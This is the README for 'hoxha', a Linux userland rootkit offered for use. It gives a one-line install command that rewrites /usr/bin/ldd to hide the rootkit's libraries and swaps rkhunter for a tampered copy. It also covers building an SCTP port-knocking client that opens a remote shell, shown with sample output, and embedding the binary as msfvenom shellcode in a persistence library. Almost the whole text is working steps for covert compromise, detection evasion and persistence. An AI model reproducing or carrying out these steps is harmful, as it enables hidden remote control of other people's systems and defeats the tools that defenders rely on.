# hoxha
A userland rootkit for x86_64 Linux that was meant to be everything <a href="https://github.com/mephistolist/tito">Tito</a> was not. As Enver Hoxha was Tito's next door neighbor and completely opposed in ideology, there was no more a fitting name. Hoxha was also known for being very paranoid, so a lot more detection-evasion was used.   

<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Enver_Hoxha_%28portret%29.jpg" width="50%" height="50%" />
</p>

You can download this like so:
```
git clone https://github.com/mephistolist/hoxha.git
```
Considering SCTP is installed and loaded in the kernel, you can install the rootkit this:
```
cd hoxha && make install clean && cd /persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
```
On another device you can build the client with the following in the hoxha root directory:
```
cc enver.c -o enver -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 --no-data-sections -falign-jumps=1 -falign-labels=1 -flto -fipa-icf -z execstack -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -lsctp
```
The client can be used with just the destionation ip address where this rootkit is installed:
```
# ./enver 127.0.0.1
[+] SCTP knock sequence sent.
[*] Connecting to SCTP shell at 127.0.0.1:5000...
[+] Connected. Type commands (type 'exit' to quit):
sctp-shell>
```
As SCTP ports are hard to close, I would suggest running this to exit the shell:
```
killall -9 hoxha && service cron restart
```
This will ensure that only one port is left listening for future connections.

If you wish to edit or just build the shell from source you can do so by just typing 'make' the root directory. Using 'make install' will give a binary at /usr/bin/hoxha. You can then run this with msfvenom:
```
msfvenom -p linux/x64/exec CMD=/usr/bin/hoxha -f raw -o shellcode.bin -b "\x00\x0a\x0d"
```
Then you can base64 the raw data like so:
```
cat shellcode.bin | base64
```
Add that base64 encoded string to the hoxha/persistance/libexec.c file and re-run the Makefile in the persistance folder and your changes should be running.
